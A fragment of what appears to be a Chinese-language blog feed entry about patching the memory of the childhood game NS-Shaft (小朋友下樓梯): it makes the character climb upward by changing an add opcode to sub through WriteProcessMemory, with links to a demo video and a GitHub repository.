-<p>變小朋友上樓梯…</p>
-<p>方法：找出修改y座標的opcode<br>然後把add改成sub<br>修改opcode一樣可用WriteProcessMemory<br>但盡量opcode長度改完跟原本要一樣 不然容易crash</p>
-<p>反重力Demo:<br><a href="https://drive.google.com/file/d/0B0u00oV7NdOiTjd2WDd3Y1lsc3c/view?usp=sharing" target="_blank" rel="external">https://drive.google.com/file/d/0B0u00oV7NdOiTjd2WDd3Y1lsc3c/view?usp=sharing</a><br><br></p>
-<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>程式碼放在github上：<br><a href="https://github.com/w181496/GoingDown" target="_blank" rel="external">https://github.com/w181496/GoingDown</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h2 id="u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F"><a href="#u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F" class="headerlink" title="小朋友下樓梯是啥？"></a>小朋友下樓梯是啥？</h2><p>它不僅是一個很狂的小遊戲</p>
-<p>它更代表了我們的童年回憶</p>
-<p><br><br><img src="/images/pic7.png" alt="圖7"></p>]]>
     
     </summary>
     
